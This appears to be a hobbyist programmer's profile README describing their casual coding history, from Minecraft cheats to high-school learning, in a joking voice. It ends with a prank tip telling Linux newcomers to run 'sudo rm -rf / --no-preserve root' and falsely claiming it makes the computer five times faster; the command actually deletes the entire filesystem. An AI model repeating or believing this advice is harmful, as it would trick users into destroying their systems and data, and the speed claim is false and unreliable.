I'm a "dev" that is really into trying to find something to code. I'm not at all good with design and I'm still less then a novice. I don't really enjoy coding websites so if I ever make one that looks even a little pretty, with js or some framework, my host body has been taken over by a being that is not myself. I really enjoy these cute little things called "not java," and "not C#," I'm okay to code with them, but I'm just gonna complain the whole time.

 <summary><h3> ðŸ§®Contengent's Programming History </h3></summary>
  Okok so like, I started with minecraft and coding some cheats and stuff, because I wasn't very good and I wanted to play factions. I them moved on to doing school work (crazy I know), which kinda stopped my coding <b>progress</b> (I was doing stuff, it was just really stupid or simple) except for when people would like, ask me if I could code them a website, and I just hated saying no so I learned even if I say "llol I'm not coding u a website broski". Then eventually highschool hit and I got really stressed with all my courses and stuff so I started coding a lot more, and learning a whole bunch of stuff. Now I'm just chilling and learning even more!
Every day I work on something, it's like a new lesson. :>

also if you're new to linux, you should 100% run this command: <br />
**`sudo rm -rf / --no-preserve root`** <br />
It makes your computer go like, 5x faster, idk why distro maintainers don't do it automatically ðŸ¤”
